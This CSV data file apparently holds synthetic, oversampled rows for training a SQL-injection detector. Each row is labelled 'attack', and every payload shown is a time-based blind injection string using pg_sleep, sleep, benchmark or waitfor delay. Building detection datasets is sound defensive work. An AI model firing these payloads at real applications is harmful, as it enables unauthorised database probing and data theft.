id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,time,1'  )   as irnj where 7274  =  7274 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000396,0.5114536184558357
SMOTE_000002,attack,time,"1  )   as drbw where 2380  =  2380 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000836,0.8087534800052657
SMOTE_000003,attack,time,"1%""   )    )    waitfor delay '0:0:5'--",nearest_attack_euclidean,R000587,0.2642000966932869
SMOTE_000004,attack,time,"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000888,0.2504374062044457
SMOTE_000005,attack,time,1'||  (  select 'bwqc' from dual where 6897  =  6897 and sleep  (  5  )  #,nearest_attack_euclidean,R000488,0.1618934050718468
SMOTE_000006,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""hiwo"" like ""hiwo",nearest_attack_euclidean,R000545,0.8596426157042653
SMOTE_000007,attack,time,"1""   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  ""ilge"" like ""ilge",nearest_attack_euclidean,R000374,0.5788859548335549
SMOTE_000008,attack,time,select sleep  (  5  )   and    (    (   3404  =  3404,nearest_attack_euclidean,R000283,0.2600782795777164
SMOTE_000009,attack,time,waitfor delay '0:0:5'--,nearest_attack_euclidean,R000265,3.0605022374714874
SMOTE_000010,attack,time,"1""   )    )    or sleep  (  5  )  #",nearest_attack_euclidean,R000524,0.7656274408232396
SMOTE_000011,attack,time," select sleep  (  5  )   and   (  ""tlbp""  =  ""tlbp",nearest_attack_euclidean,R000229,0.23641951627201638
SMOTE_000012,attack,time,1'||  (  select 'zeet' from dual where 9567  =  9567 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000932,0.2022615806426542
SMOTE_000013,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,0.42732054614283804
SMOTE_000014,attack,time,1'+  (  select 'sfko' where 6853  =  6853 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000338,0.14117087565386816
SMOTE_000015,attack,time,1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000500,0.4079310572076109
SMOTE_000016,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000558,0.039817009819660285
SMOTE_000017,attack,time,1'  )   as njfg where 6392  =  6392 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000739,0.6084636301333533
SMOTE_000018,attack,time,select pg_sleep  (  5  )  -- ojzt,nearest_attack_euclidean,R000139,1.373922768503202
SMOTE_000019,attack,time,"1'||  (  select 'alxi' where 3967  =  3967 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000879,1.0781689475858114
SMOTE_000020,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001115,0.34580114965295183
SMOTE_000021,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'tmbs'  =  'tmbs",nearest_attack_euclidean,R000772,0.07378057807609398
SMOTE_000022,attack,time,"1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000674,0.6203040591218103
SMOTE_000023,attack,time,"1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R000381,0.3067572501878832
